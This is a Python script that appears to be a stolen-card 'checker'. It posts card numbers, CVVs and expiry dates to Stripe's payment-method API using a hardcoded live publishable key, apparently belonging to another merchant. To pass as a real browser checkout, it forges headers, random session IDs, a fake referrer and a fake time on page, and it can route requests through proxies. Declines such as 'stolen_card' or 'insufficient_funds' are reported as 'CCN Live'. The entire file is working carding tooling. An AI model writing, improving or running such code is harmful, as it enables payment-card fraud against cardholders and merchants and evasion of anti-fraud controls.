import httpx
import asyncio
import time
import random
import string
import json
import os

DEFAULT_PK = "pk_live_514ypdsDGECUvy6xjjWF60hEXlCPf16a32J7E7PMKAUPa5hf0luKAZNduDOhkZkqbPYLSvjLl01D8tuUpJT64owYY00HBz5YoyW"

ADN_CONFIG_FILE = os.path.join(os.path.dirname(__file__), "..", "adn_config.json")


def _load_adn_pk():
    try:
        if os.path.exists(ADN_CONFIG_FILE):
            with open(ADN_CONFIG_FILE, "r") as f:
                data = json.load(f)
                return data.get("pk", DEFAULT_PK)
    except:
        pass
    return DEFAULT_PK


def set_adn_pk(pk):
    try:
        with open(ADN_CONFIG_FILE, "w") as f:
            json.dump({"pk": pk}, f)
    except:
        pass

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

LIVE_DECLINE_CODES = {
    "insufficient_funds", "do_not_honor", "generic_decline",
    "lost_card", "stolen_card", "pickup_card",
    "restricted_card", "not_permitted", "security_violation",
    "incorrect_cvc", "incorrect_zip",
    "card_velocity_exceeded", "withdrawal_count_limit_exceeded",
    "transaction_not_allowed", "try_again_later",
    "card_not_supported", "currency_not_supported",
    "duplicate_transaction", "reenter_transaction",
    "fraudulent", "merchant_blacklist",
    "issuer_not_available", "processing_error",
    "approve_with_id", "call_issuer",
}


async def adyen_auth_check(cc, mm, yy, cvv, proxy=None):
    start = time.time()

    if len(yy) == 2:
        yy_full = f"20{yy}"
    else:
        yy_full = yy

    guid = ''.join(random.choices(string.hexdigits.lower(), k=36))
    muid = ''.join(random.choices(string.hexdigits.lower(), k=36))
    sid = ''.join(random.choices(string.hexdigits.lower(), k=36))

    client_kwargs = {"timeout": httpx.Timeout(20)}
    if proxy:
        client_kwargs["proxy"] = proxy

    try:
        async with httpx.AsyncClient(**client_kwargs) as client:
            pk = _load_adn_pk()

            pm_data = {
                "type": "card",
                "card[number]": cc,
                "card[cvc]": cvv,
                "card[exp_month]": mm,
                "card[exp_year]": yy_full,
                "billing_details[name]": "John Smith",
                "guid": guid,
                "muid": muid,
                "sid": sid,
                "payment_user_agent": "stripe.js/eead51ae1e; stripe-js-v3/eead51ae1e; card-element",
                "time_on_page": str(random.randint(15000, 45000)),
                "key": pk,
                "pasted_fields": "number",
                "referrer": "https://app.mixmax.com",
            }

            pm_headers = {
                "User-Agent": UA,
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
            }

            resp = await client.post(
                "https://api.stripe.com/v1/payment_methods",
                data=pm_data,
                headers=pm_headers,
            )

            r = resp.json()
            elapsed = round(time.time() - start, 2)

            if "error" in r:
                err = r["error"]
                code = err.get("code", "")
                decline_code = err.get("decline_code", "")
                msg = err.get("message", str(err))

                if code in ("incorrect_number", "invalid_number"):
                    return f"Declined - Invalid card number [{elapsed}s]"
                elif code in ("invalid_expiry_year", "invalid_expiry_month", "expired_card"):
                    return f"Declined - {msg} [{elapsed}s]"
                elif code == "invalid_cvc":
                    return f"Declined - Invalid CVV [{elapsed}s]"
                elif code == "card_declined":
                    if decline_code == "live_mode_test_card":
                        return f"Declined - Test card in live mode [{elapsed}s]"
                    elif decline_code in LIVE_DECLINE_CODES:
                        return f"Approved - CCN Live - {msg} [{elapsed}s]"
                    else:
                        return f"Declined - {msg} [{elapsed}s]"
                elif code == "rate_limit":
                    return f"Error - Rate limited, try again [{elapsed}s]"
                else:
                    return f"Declined - {msg} [{elapsed}s]"

            pm_id = r.get("id", "")
            card = r.get("card", {})
            brand = (card.get("display_brand") or card.get("brand", "unknown")).upper()
            last4 = card.get("last4", cc[-4:])
            funding = (card.get("funding") or "unknown").upper()
            country = card.get("country", "??")
            threed = card.get("three_d_secure_usage", {}).get("supported", False)

            if not pm_id:
                return f"Error - No payment method [{elapsed}s]"

            info_parts = [brand, funding, country]
            if threed:
                info_parts.append("3DS")
            info_str = " | ".join(info_parts)

            return f"Approved - Card Valid | {info_str} [{elapsed}s]"

    except httpx.TimeoutException:
        elapsed = round(time.time() - start, 2)
        return f"Error - Gateway timeout [{elapsed}s]"
    except Exception as e:
        elapsed = round(time.time() - start, 2)
        return f"Error - {str(e)[:80]} [{elapsed}s]"
